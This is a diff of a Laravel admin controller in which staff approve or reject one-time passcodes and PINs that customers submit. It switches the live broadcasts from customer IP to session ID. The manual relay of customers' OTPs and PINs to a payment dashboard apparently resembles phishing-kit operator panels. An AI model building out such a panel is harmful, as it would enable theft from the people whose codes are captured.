@@ -66,16 +66,16 @@ class AdminOtpController extends Controller
 
         try {
             if ($otp->type === 'otp') {
-                broadcast(new OtpApproved($customerIp, null, $sessionId, $customerId))->toOthers();
+                broadcast(new OtpApproved($sessionId, null, $customerId))->toOthers();
             } elseif ($otp->type === 'pin') {
-                broadcast(new PinApproved($customerIp, null, $sessionId, $customerId))->toOthers();
+                broadcast(new PinApproved($sessionId, null, $customerId))->toOthers();
             }
         } catch (\Throwable $e) {
             Log::warning('Broadcast failed (approveOtp): ' . $e->getMessage());
         }
 
-        $this->notifyDashboard($customerIp, $otp->type === 'pin' ? 'pin_approved' : 'otp_approved');
-        $this->refreshPaymentViewed($customerIp);
+        $this->notifyDashboard($otp->customer ?? $customerIp, $otp->type === 'pin' ? 'pin_approved' : 'otp_approved');
+        $this->refreshPaymentViewed($otp->customer ?? $customerIp);
 
         return response()->json([
             'success' => true,
@@ -122,16 +122,16 @@ class AdminOtpController extends Controller
 
         try {
             if ($otp->type === 'otp') {
-                broadcast(new OtpRejected($customerIp, $reason, $sessionId, $customerId))->toOthers();
+                broadcast(new OtpRejected($sessionId, $reason, $customerId))->toOthers();
             } elseif ($otp->type === 'pin') {
-                broadcast(new PinRejected($customerIp, $reason, $sessionId, $customerId))->toOthers();
+                broadcast(new PinRejected($sessionId, $reason, $customerId))->toOthers();
             }
         } catch (\Throwable $e) {
             Log::warning('Broadcast failed (rejectOtp): ' . $e->getMessage());
         }
 
-        $this->notifyDashboard($customerIp, $otp->type === 'pin' ? 'pin_rejected' : 'otp_rejected');
-        $this->refreshPaymentViewed($customerIp);
+        $this->notifyDashboard($otp->customer ?? $customerIp, $otp->type === 'pin' ? 'pin_rejected' : 'otp_rejected');
+        $this->refreshPaymentViewed($otp->customer ?? $customerIp);
 
         return response()->json([
             'success' => true,
